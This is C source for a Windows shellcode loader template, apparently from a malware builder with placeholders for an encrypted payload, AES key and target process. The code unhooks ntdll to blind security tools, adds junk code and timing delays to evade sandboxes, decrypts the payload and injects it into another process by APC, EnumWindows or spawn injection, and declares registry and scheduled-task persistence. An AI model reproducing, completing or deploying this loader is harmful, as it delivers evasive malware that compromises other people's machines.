#include <stdio.h>
#include <windows.h>

#include "whispers.h"
#include "functions.h"
#include "AES_128_CBC.h"
#include "obfuscation.h"

// Junk function
void junk_function(void) {
    volatile int x = 0;
    for (int i = 0; i < 100; i++) x++;
}

void add_persistence_reg(void);
void add_persistence_task(void);

#define TARGET_PROCESS "#-TARGET_PROCESS-#"

uint8_t aes_k[16] = { #-KEY_VALUE-# };
uint8_t aes_i[16] = { #-IV_VALUE-# };

unsigned char payload[] = {
        #-PAYLOAD_VALUE-#
};

#ifdef USE_SPAWN
BOOL SpawnAndInject(PVOID pPayload, SIZE_T sPayload);
#endif

#ifdef USE_ENUMWINDOWS
BOOL EnumWindowsInjection(PBYTE pShellcode, SIZE_T sSize);
#endif

int main() {

        SIZE_T          sEncPayload                     = sizeof(payload);
        PVOID           pClearText                      = NULL,
                                pProcess                        = NULL;
        DWORD           dwSizeOfClearText       = 0,
                                dwOldProtect            = 0,
                                dwProcessId                     = 0;
        AES_CTX         ctx;

        HANDLE          hThread                         = NULL,
                                hProcess                        = NULL;

        NTSTATUS        STATUS                          = 0x00;

        LPVOID nt = MapNtdll();
        if (!nt) return -1;
        if (!Unhook(nt)) return -1;

        if (OPAQUE_FALSE) junk_function(); // never executed

        high_cpu_wait(500);

        pClearText = (PBYTE)malloc(sEncPayload);
        AES_DecryptInit(&ctx, aes_k, aes_i);
        AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload);

        high_cpu_wait(1500);

//#-INJECTION-#   // replaced with #define USE_ENUMWINDOWS if selected
#ifdef USE_ENUMWINDOWS
        // --- ENUMWINDOWS INJECTION ---
        if (!EnumWindowsInjection(pClearText, sEncPayload)) {
                free(pClearText);
                return -1;
        }
#elif defined(USE_SPAWN)
        // --- SPAWN INJECTION ---
        if (!SpawnAndInject(pClearText, sEncPayload)) {
                free(pClearText);
                return -1;
        }
#else
        // --- ORIGINAL APC INJECTION ---
        if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
                free(pClearText);
                return -1;
        }

        high_cpu_wait(2500);

        if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess)) {
                free(pClearText);
                return -1;
        }

        high_cpu_wait(1500);

        if ((STATUS = NTQAT(hThread, pProcess, NULL, NULL, NULL)) != 0) {
                free(pClearText);
                return -1;
        }

        cDAPS cDAPSu = (cDAPS) GetProcAddressH(GetModuleHandleH(#-KERNELBASE_VALUE-#), #-DAPS_VALUE-#);
        high_cpu_wait(1000);
        cDAPSu(dwProcessId);

        CloseHandle(hThread);
        CloseHandle(hProcess);
#endif

        // Injection completed
        free(pClearText);
        return 0;
}
